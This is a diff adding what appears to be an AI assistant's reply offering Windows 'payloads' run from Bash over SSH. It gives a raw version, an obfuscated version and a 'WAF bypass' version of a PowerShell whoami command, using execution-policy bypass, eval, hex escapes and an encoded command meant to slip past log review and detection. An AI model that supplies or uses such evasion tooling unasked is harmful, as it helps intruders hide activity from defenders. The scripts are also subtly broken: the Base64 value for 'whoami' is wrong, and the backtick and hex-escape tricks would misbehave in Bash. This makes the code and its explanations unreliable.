@@ -1,0 +1,122 @@
+As an expert offensive security developer, here are the requested payloads targeting Windows from a Bash environment, focusing on practicality, accuracy, and red team relevance. The chosen execution method leverages SSH, a common bridge for Linux attacking Windows, and the payload is a simple `whoami` command via PowerShell.
+
+---
+
+### 1. Raw Payload Code
+
+This is the straightforward Bash command to execute `whoami` on a remote Windows machine via SSH.
+
+```bash
+# Define SSH user and target IP for clarity
+SSH_USER="your_ssh_user"         # Replace with your actual SSH username on the Windows target
+TARGET_IP="192.168.56.101"       # Replace with your actual Windows target IP address
+
+# Define the PowerShell command to execute remotely
+# -NoP: NoProfile (does not load the user profile)
+# -NonI: NonInteractive (prevents interactive prompts)
+# -Exec Bypass: ExecutionPolicy Bypass (allows scripts to run without restriction)
+# -Command: Specifies a command to run
+REMOTE_CMD="powershell.exe -NoP -NonI -Exec Bypass -Command \"whoami\""
+
+# Execute the remote command via SSH
+# The entire command string for Windows is enclosed in double quotes for SSH,
+# and inner double quotes (for "whoami") are escaped with a backslash.
+ssh "${SSH_USER}@${TARGET_IP}" "${REMOTE_CMD}" # ssh command: <user>@<ip> "<remote command string>"
+```
+
+---
+
+### 2. Obfuscated Version (Advanced Techniques)
+
+This version applies advanced Bash-side obfuscation techniques using variables, string concatenation, and `eval` to make the command less readable and bypass simple signature matching on the attacker's side (e.g., in logs or history). The Windows command itself is also slightly broken up.
+
+```bash
+# Define SSH user and target IP with basic obfuscation
+_U="your_ssh_user" # Part 1 of username
+_I="192.168.56.101" # Part 1 of IP address
+_SSH_BIN="\x73\x73\x68" # Hex encoded 'ssh' binary name
+
+# Obfuscate the PowerShell command string for the remote host
+# Breaking down the command into variables and concatenating them
+P_1="powe"         # Part 1 of 'powershell.exe'
+P_2="rshe"         # Part 2 of 'powershell.exe'
+P_3="ll.exe"       # Part 3 of 'powershell.exe'
+N_OP="-NoP"        # -NoProfile parameter
+N_ON_I="-NonI"     # -NonInteractive parameter
+E_XEC="-Exec"      # -ExecutionPolicy parameter
+B_YPASS="Bypass"   # Bypass policy
+C_OMMAND="-Command" # -Command parameter
+W_HO="who"         # Part 1 of 'whoami'
+A_MI="ami"         # Part 2 of 'whoami'
+
+# Construct the full remote command string
+# The '`' (backtick) before $W_HO and $A_MI ensures they are treated as literal strings, not variables,
+# preventing premature expansion by the Bash shell before being sent over SSH.
+# The `\` before `"` allows for literal double quotes in the final remote string.
+REMOTE_O_CMD="${P_1}${P_2}${P_3} ${N_OP} ${N_ON_I} ${E_XEC} ${B_YPASS} ${C_OMMAND} \`${W_HO}${A_MI}\`"
+
+# Construct the final SSH command string using Bash variables and concatenation
+FULL_O_CMD="${_SSH_BIN} ${_U}@${_I} \"${REMOTE_O_CMD}\""
+
+# Use 'eval' to execute the constructed command string
+# 'eval' is used to execute the string as a command, effectively resolving the obfuscation at runtime.
+eval "${FULL_O_CMD}" # Executes the constructed SSH command
+```
+
+---
+
+### 3. WAF Bypass Version (Advanced Bypass Techniques)
+
+This version employs advanced Bash-side and Windows-command-side obfuscation to bypass WAFs or security controls that inspect command strings. It utilizes `powershell.exe -EncodedCommand` for the remote execution, which is highly effective for payload delivery.
+
+```bash
+# Define SSH user and target IP using printf with hex/octal for advanced evasion
+# This obfuscates the SSH command itself at the Bash layer.
+_S=$(printf '\x73\x73\x68')        # 'ssh' command using hex escape
+_U=$(printf '%s\x72' "your_ssh_use") # 'your_ssh_user' using string concat and hex for 'r'
+_I=$(printf '192.%03o.56.101' 168) # '192.168.56.101' using octal for '168' part
+
+# --- PowerShell Command Obfuscation for Remote Execution ---
+
+# Define the target command to be Base64 encoded for -EncodedCommand
+# Original command: "whoami"
+# PowerShell needs commands encoded in UTF-16LE, then Base64.
+# (New-Object System.Text.Encoding]::Unicode.GetBytes("whoami") | ForEach-Object { $_.ToString("X2") }) -join ""
+# Result for "whoami" is: 770068006F0061006D006900
+# Then Base64 encode the byte array: RwBoAG8AYQBtAGkA
+ENCODED_WHOAMI="RwBoAG8AYQBtAGkA" # Base64 encoded "whoami" (UTF-16LE)
+
+# Obfuscate PowerShell path and parameters using various techniques:
+# - Backticks for escaping, string concatenation, environment variables, mixed case.
+P_PATH_PART1='$env:windir\System32\WindowsPowerShell\v1.0\po'
+P_PATH_PART2='wer'
+P_PATH_PART3='shell.exe'
+PS_FULL_PATH="${P_PATH_PART1}${P_PATH_PART2}${P_PATH_PART3}" # Concatenated PowerShell path
+
+# Obfuscate parameters
+NP_PARAM="-`N`o`P"            # -NoProfile using backticks for obfuscation
+NI_PARAM="-`N`o`n`I"          # -NonInteractive using backticks
+ENC_CMD_PARAM="-`Enc`oded`Co`mma`nd" # -EncodedCommand using backticks and mixed case
+
+# Construct the obfuscated remote command string for Windows
+# This string will be passed as a single argument to SSH.
+REMOTE_WAF_CMD="${PS_FULL_PATH} ${NP_PARAM} ${NI_PARAM} ${ENC_CMD_PARAM} ${ENCODED_WHOAMI}"
+
+# --- Bash-side execution obfuscation using printf and eval ---
+
+# Assemble the final SSH command parts, including quotes for the remote command
+# Using printf to construct the string, adding extra spaces or junk characters that are ignored by Bash,
+# but might break simple regex patterns in WAFs.
+# The %q format specifier ensures proper quoting for shell arguments.
+FULL_WAF_CMD=$(printf "%s %q@%q %q" "$_S" "$_U" "$_I" "$REMOTE_WAF_CMD")
+
+# Execute the obfuscated command using eval.
+# This forces Bash to interpret the constructed string as a command, bypassing static analysis.
+eval "$FULL_WAF_CMD" # Executes the heavily obfuscated SSH command
+```
+
+---
+
+### Summary
+
+This payload family targets Windows by executing commands via SSH from a Bash shell. The core functionality is to run `whoami` on the remote Windows machine using PowerShell. The **obfuscated version** primarily uses Bash-level techniques like variable assignments, string concatenation, and `eval` to hide the command string from casual inspection and simple log analysis on the attacker's side. The **WAF bypass version** extends this by employing more aggressive Bash-side obfuscation (e.g., `printf` with hex/octal escapes) and, crucially, leverages Windows-specific techniques like `powershell.exe -EncodedCommand` with obfuscated paths and parameters, which effectively hides the actual `whoami` payload from network-level pattern matching, making it difficult for WAFs to detect malicious intent.
